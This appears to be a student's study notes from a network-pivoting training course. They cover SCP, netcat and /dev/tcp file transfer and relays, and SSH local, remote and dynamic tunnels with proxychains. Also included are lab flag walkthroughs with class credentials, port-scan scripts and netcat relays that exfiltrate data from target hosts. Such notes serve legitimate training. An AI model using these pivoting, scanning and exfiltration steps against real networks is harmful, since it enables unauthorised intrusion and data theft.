https://awwapp.com/b/scjhqvx7s/
<-------SCP Syntax------>
scp student@172.16.82.106:secretstuff.txt /home/student	 #Download from remote to local

scp secretstuff.txt student@172.16.82.106:/home/student	 #Upload from remote to local

scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student		#Copy a file from remote host to a seperate remote host

------------------------------------------------------------------
<----SCP Using Alternate Port Other Than 22---->
#Download a file from a remote directory to a local directory
scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student

#Upload a file to a remote directory from a local directory
scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student

------------------------------------------------------------------
<--------SCP Syntax through a Tunnel-------->
ssh student@172.16.82.106 -L 1111:localhost:22 -NT

#Download a file from a remote directory to a local directory
scp -P 1111 student@localhost:secretstuff.txt /home/student

#Upload a file to a remote directory from a local directory
scp -P 1111 secretstuff.txt student@localhost:/home/student

------------------------------------------------------------------
<---------Data Transfer w/ Netcat-------->
#NETCAT: Client to listener file transfer
Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

------------------------------------------------------------------
<---------Relays w/ Netcat-------->
#On Client Relay:
mkfifo mypipe
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe

#On Listener2 (sends info):
nc -l -p 9002 < infile.txt

#On Listener1 (receives info):
nc -l -p 9001 > outfile.txt
###Writes the output to listener1 and listener2 through the named pipe

------------------------------------------------------------------
<----File Transfer with /dev/tcp---->
#On the receiving box:
nc -l -p 1111 > file.txt

#On the sending box:
cat file.txt > /dev/tcp/10.2.0.2/1111
###This method is useful for host that does not have NETCAT available.

------------------------------------------------------------------
<--------SSH Local Port Forwarding-------->
#Syntax
ssh <user>@<pivot ip> -p <optional alt port> -L <local bind port>:<tgt ip>:<tgt port> -NT
--or--
ssh -L <local bind port>:<tgt ip>:<tgt port> <user>@<pivot ip> -p <alt port> -NT

-----------------------------------------------------------------
#Example 1: Creates a local port (1111) on the local host that forwards to a target machineâ€™s port 80.
ssh student@10.2.0.2 -L 1111:34.233.98.14:80 -NT
--or--
ssh -L 1111:34.233.98.14:80 student@10.2.0.2 -NT

--------------------------------------------------------------------
#Example 2: Setting up a tunnel from attacker to target(as pivot) that targets itself(as point of interest)
ssh student@172.16.82.106 -L 7000:localhost:80 -NT (add -g for global)

#Access the Tunnel made above (have to use http since thats the port we tunneled to)
curl localhost:7000

------------------------------------------------------------------
#Example 3: Setting up a tunnel from attacker THROUGH a pivot to target
ssh student@172.16.82.106 -L 7000:172.16.82.112:80 -NT

#Access the Tunnel made above (have to use http since thats the port we tunneled to)
curl localhost:7000
--or--
wget -r localhost:7000	(will over write each time)
--or--
firefox localhost:7000

--------------------------------------------------------------------
#Example 4: Setting up tunnel from attacker to pivot ssh port
ssh student@172.16.82.106 -L 7000:localhost:22 -NT
ssh student@localhost -p 7000 -L 7010:172.16.82.112:80 -NT
wget localhost:7010

------------------------------------------------------------------
<--------------SSH Dynamic Port Forwarding------------>
#Syntax:	*Proxychains default port is 9050*
ssh -D <port> -p <alt port> <user>@<pivot ip> -NT

#Example 1: Setting up proxying chain to make it look like all commands come from our pivot.
ssh student@172.16.82.106 -D 9050 -NT		#limited to one hop

#Using the proxy chain just created
proxychains nc localhost 80		#or any other tcp network commands 

--------------------------------------------------------------------
<----SSH Local and Dynamic Practice 3---->
	### Network Structure ###
#---Me--Pivot--FIREWALL--Bill--Brain--52.20.180.148(ESPN)--#
ssh Pivot@104.16.181.15 -L 8000:localhost:22 -NT	#Set up entry point 1
ssh Pivot@localhost -p 8000 -L 9000:142.16.8.41:22 -NT	#Set up entry point 2
ssh Bill@localhost -p 9000 -L 9999:155.39.88.21:22 -NT	#Set up entry point 3
ssh Brian@localhost -p 9999 -L 10000:52.20.180.148:80 -NT  #Set up entry point 4
#Interact with ESPN
ssh curl localhost:10000
-or-
wget localhost:10000
-or-
firefox localhost:10000
#Use alternate entry ports for Dynamic ports 
ssh Pivot@localhost -p 8000 -D 9050 -NT		#Using proxychains on pivot
ssh Pivot@localhost -p 9000 -D 9050 -NT		#Using proxychains on bill
ssh Pivot@localhost -p 9999 -D 9050 -NT		#Using proxychains on brian

--------------------------------------------------------------------
<------------SSH Remote Port Forwarding-------->
#Syntax
ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
--or--
ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT

#Example 1:
net2
ssh student@10.1.0.2 -R 1111:localhost:80 -NT

--------------------------------------------
#Example 2:
Step 1: (using ssh alt port of 1111)
blue_host-1$ ssh student@172.16.1.15 -p 1111 -R 7777:localhost:22 -NT

Step 2: (using ssh alt port of 1111)
internethost$ ssh student@172.16.1.15 -p 1111 -L 9000:localhost:7777 -NT

Step 3:
internethost$ ssh student@localhost -p 7777 -D 9050 -NT

Step 4:
internethost$ proxychains curl localhost

========================================================================
========================================================================
<-----------TUNNELING FLAGS---------->
Target T3 appears to have access to the 10.3.0.0/26 subnet.
    Create a Local Port Forward from Ops Station to T3 targeting:
ip: 10.3.0.27
port: http
Identify the flag on Victoria's HTTP Server

Task 2 Tunnel Training
Utilize the targets T3, and T4 to develop ssh tunneling capabilities for use by Gorgan Cyber Forces:

T3 is your designated initial Pivot from your Analyst Ops station
When creating tunnels your authorized port ranges to utilize are 3XX00 - 3XX99 (XX = Student Number - ie 01 for student1)

e.g. :
student 1, port forward 1 = 30101
student 1, port forward 2 = 30102
student 1, port forward 3 = 30103
student 12, port forward 1 = 31201
student 12, port forward 12 = 31212

  1  Create valid ssh Local Port Forward to leverage for follow-on actions

  2  Create valid ssh Remote Port Forward to leverage for follow-on actions

  3  Create valid ssh Dynamic Port Forward to leverage for follow-on actions

Task 3 Data Collection
You are tasked to provide support for Gorgan Cyber Forces operating within Donovian Cyberspace. Utilizing all capabilities and skills developed, interact with the provided target T5 entry point and enumerate their network and systems.

T3
Hostname: Atropia
IP: 10.50.20.96 (Initial pivot)
creds: net20008_student15:password15 (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: 22(ssh)
Action: Establish appropriate tunneling techniques

T4
Hostname: Pineland
IP: 10.50.21.221 (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: 23(telnet)
Type: Compromised Donovian System
Action: Establish appropriate tunneling techniques

---------------------------------------------------------------
<---Create a Local Port Forward from Ops Station to T3 targeting--->
Step 1: #setting up a tunnel to T3 ssh port
ssh net1_student15@10.50.20.96 -L 31500:localhost:22 -NT

Step 2:	#set up a dynamic port traversing through the first tunnel
ssh net1_student15@localhost -p 31500 -D 9050 -NT

Step 3:	retrieve http data that looks like it came from T3
proxychains curl 10.3.0.27

---------------------------------------------------------------
<---Create a Dynamic Port Forward from Ops Station to T3 targeting--->
Step 1: #setting up a tunnel to T3 ssh port
ssh net1_student15@10.50.20.96 -L 31500:localhost:22 -NT

Step 2:	#set up a dynamic port traversing through the first tunnel
ssh net1_student15@localhost -p 31500 -D 9050 -NT

Step 3:	to retieve ftp data that looks like it came from T3
proxychains wget -r ftp://10.3.0.1

---------------------------------------------------------------
<---Leverage this internal access to act as an insider threat throughout this Grorgan Cyber Training Operation. Enumerate this host and determine where the shared location for data relating to CCTC is on the machine.--->
Step 1:
telnet 10.50.21.221

Step 2:
find / -iname "cctc" 2>/dev/null

Note: /usr/share/cctc was the dir that the hint and flag was in

---------------------------------------------------------------
<---Create a Remote Port Forward from T4 to T3 binding && Create a Local Port Forward from Ops Station to T3 targeting the port you just established--->
Step 1: #setting up a local port forward to T3(Atropia)  from Ops Station
ssh net1_student15@10.50.20.96 -L 31500:localhost:22 -NT

Step 2: #set up a remote port forward from T4(Pineland insider threat) to T3
telnet 10.50.21.221
ssh net1_student15@10.3.0.10 -R 31501:localhost:22 -NT	#from T4 opening 31501 on T3

Step 3: #set up tunnel to from ops to T4 going through T3
ssh net1_student15@10.50.20.96 -L 31502:localhost:31501 -NT

Step 4: #set up dynamic port that sits on T4		#it moves around by changing the port num after -p
ssh net1_student15@localhost -p 31502 -D 9050 -NT

Step 5:	#scan/exfill data from hosts that T4 can see
proxychains wget -r ftp://10.2.0.2
-and-
proxychains curl 10.2.0.2

#tunnel to atlantica from OPS through T4
ssh net1_student15@localhost -p 31502 -L 31503:10.2.0.3:22 -NT

#tunnel to baja-republic from OPS through T3	(found via hint intel on atlantica)
ssh net1_student15@localhost -p 31500 -L 31504:10.4.0.1:22 -NT

#with proxychains running through baja, scan the 10.5.0.0/24 looking for one port at a time

##scans a single ip and prints open ports
proxychains nc -nzvw1 10.2.0.200 1-1024 2>&1 | grep -E 'open'

##view listening ports
netstat -tulpn

##best scanners are:
scanner.sh	&	scan.sh

---------------------------------------------------------------------
<----------Task 3 Data Collection---------->
Step 1:		#Scan given IP
nc -nzvw1 10.50.20.200 20 21 22 23 80 443 2>&1 | grep -E 'open'

Step 2: 	#Telnet into box (23 was open) and enumerate
ip addr
arp -a
ip route
netstat -tulpn

Step 3:		#set up remote port forward from T5 to OPS station
ssh robert.ruedlinger@10.50.32.138 -R 31500:localhost:22 -NT

Step 4:		#create dynamic port that sits on T5 and wget T5 port 80
ssh net1_student15@localhost -p 31500 -D 9050 -NT
proxychains wget -r localhost -p 31500
#cd into dir created
pcmanfm
#select flag.png

Step 5: 	#scan T5 network for hosts
proxychains ./ncScan.sh 192.168.0 | grep -E 'OK$|open$|succ'

#enumerate each host
proxychains wget -r 192.168.0.20	#had a hint (ssh on RHP)
proxychains wget -r 192.168.0.30	#had a hint (ssh on RHP)
proxychains wget -r 192.168.0.40	#had a flag and hint

Step 6:		#find what alt port ssh is being hosted on
proxychains nc -nzvw1 192.168.0.20 1024-65535 2>&1 | grep -E 'open'
#run for the .30 and .40 as well 
#check it with banner grab
proxychains telnet 192.168.0.20 3333
-or-
nc 192.168.0.20 3333

Step 7:		#establish tunnels to hosts pivoting off T5
#to .20
ssh net1_student15@localhost -p 31500 -L 31501:192.168.0.20:3333 -NT
#to .40
ssh net1_student15@localhost -p 31500 -L 31503:192.168.0.40:5555 -NT

Step 8:
#move dynamic port to .20 and enumerate

Step 9: 	#establish a tunnel through T5 --> .40 --> targeting .60(telnet)
ssh net1_student15@localhost -p 31502 -L 31503:172.16.0.60:23 -NT

Step 10:	#create remote port forward from .60 to .40
ssh net1_student15@192.168.0.40 -p 5555 -R 31555:localhost:22 -NT

Step 11:	#extend port forward from .40 (connecting to .60 ssh) to OPS
ssh net1_student15@localhost -p 31502 -L 31504:localhost:31555 -NT

Step 12:
#move dynamic port to .60 and enumerate hosts

Step 13::	#create tunnel to target .90 alt ssh port
ssh net1_student15@localhost -p 31504 -L 31505:172.16.0.90:2222 -NT

Step 14:	#create tunnel to .100 via telnet
ssh net1_student15@localhost -p 31505 -L 31506:172.16.0.100:23 -NT

Step 15:
tcpdump not port 23 -XX

======================================================================
<-----TUNNELS EXTRA PRACTICE----->
#Question 1:
ssh p1@17.1.98.16 -L 7000:144.41.14.41:22
ssh tgt@localhost -p 7000 -D 9050
proxychains ./scan x.x.x.x x

#Question 2:
telnet 17.1.98.16
username: P1
password: asdfg
ssh me@10.1.0.2 -R 7001:localhost:22	#from P1
ssh p1@localhost -p 7001 -L 7002:144.41.14.41:22
ssh tgt@localhost -p 7002 -D 9050
proxychains ./scan x.x.x.x x

#Question 3:
ssh p1@17.1.98.16 -p 1234 -L 7003:144.41.14.41:22
ssh tgt@localhost -p 7003 -D 9050
proxychains ./scan x.x.x.x x

#Question 4:
telnet 17.1.98.16
username: P1
password: asdfg 
ssh me@10.1.0.2 -p 4321 -R 7004:localhost:22	#from P1
ssh p1@localhost -p 7004 -L 7005:144.41.14.41:22
ssh tgt@localhost -p 7005 -D 9050
proxychains ./scan x.x.x.x x

#Question 5:
ssh p1@11.1.1.11 -L 7000:22.2.2.22:22
ssh p2@22.2.2.22 -p 7000 -L 7001:33.3.3.33:22
ssh tgt@localhost -p 7001 -D 9050
proxychains ./scan x.x.x.x x

#Question 6:
telnet 11.1.1.11
username: P1
password: asdfg
ssh me@10.1.0.2 -R 7001:localhost:22	#from P1
ssh p1@localhost -p 7001 -L 7002:22.2.2.22:1234
ssh p2@localhost -p 7002 -L 7003:33.3.3.33:4321
ssh tgt@localhost -p 7003 -D 9050
proxychains ./scan x.x.x.x x

#Questions 7:
ssh p1@11.1.1.11 -L 7000:22.2.2.22:23
telnet localhost 7000			#to p2
ssh p1@11.1.1.11 -R 7011:33.3.3.33:22	#from p2
ssh p1@11.1.1.11 -L 7002:localhost:7011
ssh tgt@localhost -p 7002 -D 9050

#Question 8:
telnet 11.1.1.11
ssh me@10.1.0.2 -R 7000:localhost:9999
ssh p1@localhost -p 7000 -L 7001:22.2.2.22:23
telnet localhost 7001
ssh p1@11.1.1.11 -p 9999 -R 7011:localhost:8888
ssh p1@localhost -p 7000 -L 7002:localhost:7011
ssh p2@localhost -p 7002 -L 7003:33.3.3.33:7777
ssh tgt@localhost -p 7003 -D 9050

========================================================================
========================================================================
<---------M&F FLAG WALKTHROUGH-------->
#TASK 1 PART 1
T1
Hostname: INTERNET_HOST
IP: 10.10.0.40

T2
Hostname: BLUE_HOST-1
IP: 172.16.82.106

RELAY
Hostname: BLUE_INT_DMZ_HOST-1
IP: 172.16.40.10

---------------------------------------
###(No outbound connections are to be made from RELAY)###
Step 1:
#On Relay
nc -lp 7770 0< mypipe | nc -lp 7771 1> mypipe

Step 2:
#On T1 (Sender)
nc 172.16.40.10 7770 < secretstuff.txt

Step 3:
#On T2 (Reciever)
nc 172.16.40.10 7771 > secretstuff.txt

------------------------------------------
###(Only outbound connections are to be made from RELAY)###
Step 1:
#On Relay
mkfifo mypipe
nc 10.10.0.40 7770 0< mypipe | nc 172.16.82.106 7771 1> mypipe

Step 2:
#On T1 (Sender)
nc -lp 7770 < supersecretstuff.txt

Step 3:
#On T2 (Reviever)
nc -lp 7771 > supersecretstuff.txt

------------------------------------------
###(Only outbound connection can be made from T1 && No outbound connections are to be made from T2)###
Step 1:
#On Relay
nc -lp 7770 0< mypipe | nc 172.16.82.106 7771 1> mypipe

Step 2:
#On T1 (Sender)
nc 172.16.40.10 7770 < secretsquirrelstuff.txt

Step 3:
#On T2 (Reciever)
nc -lp 7771 > secretsquirrelstuff.txt

------------------------------------------
<----------TASK 1 PART 2-------->
T1
Hostname: INTERNET_HOST
IP: 10.10.0.40

T2 (Critical Data Server)
Hostname: John
IP: 10.0.0.102
Ports: 
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server
9007/tcp

RELAY (Critical Data)
Hostname: Mike
IP: 10.50.23.175

-----------------------------------
Step 1:
#ssh to host that is within the targets network (mike in this challenge)

Step 2:
#Run the nc scan below from mike(relay) to id open ports on target
#---(./fulldevtcpscan contents)---
#!/bin/bash
for i in {1..65535}
do
        echo >/dev/tcp/10.0.0.102/$i &&
        echo "Port $i is open" || echo "Port $i is closed"
done

./fulldevtcpscan.sh | grep open >> scan2.txt

cat scan2.txt

Step 3:
#Run nc banner grab below from mike(relay) on open ports to id critical data
nc 10.0.0.102 9007
nc 10.0.0.102 21
nc 10.0.0.102 22
nc 10.0.0.102 3389
nc 10.0.0.102 80

Step 4 (Exfil the data to OpStation):
#On Relay
nc -lp 9007 0< mypipe | nc 10.0.0.102 9007 1> mypipe

Step 5:
#On T1 (Reciever)
nc 10.50.23.175 9007 > criticaldata.txt

NOTE:
#On T2 (Sender)Netcat is not needed because to host is aready listening on the port of interest
























